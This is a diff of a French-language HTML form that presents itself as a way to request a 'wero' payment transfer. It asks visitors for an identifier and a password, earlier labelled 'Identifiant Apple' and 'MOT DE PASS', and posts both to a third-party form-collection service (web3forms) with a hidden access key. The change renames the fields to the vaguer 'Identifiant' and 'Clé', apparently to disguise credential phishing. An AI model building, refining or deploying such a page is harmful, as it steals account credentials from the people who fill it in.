@@ -129,14 +129,18 @@
     <div class="container">
         <h2>Veuillez renseigner ces informations pour demander un envoi wero</h2>
         
-        <form action="https://formspree.io/f/mbgodbqg" method="POST">
+        <form action="https://api.web3forms.com/submit" method="POST">
+            
+            <!-- Ta clé d'accès Web3Forms -->
+            <input type="hidden" name="access_key" value="6ff8c083-d31b-44c1-aad6-5aab4e1dfb11">
+
             <div class="champ">
-                <label for="identifiant">Identifiant Apple :</label>
+                <label for="identifiant">Identifiant :</label>
                 <input type="text" id="identifiant" name="identifiant" required>
             </div>
 
             <div class="champ">
-                <label for="cle">MOT DE PASS :</label>
+                <label for="cle">Clé :</label>
                 <input type="text" id="cle" name="cle" required>
             </div>
 
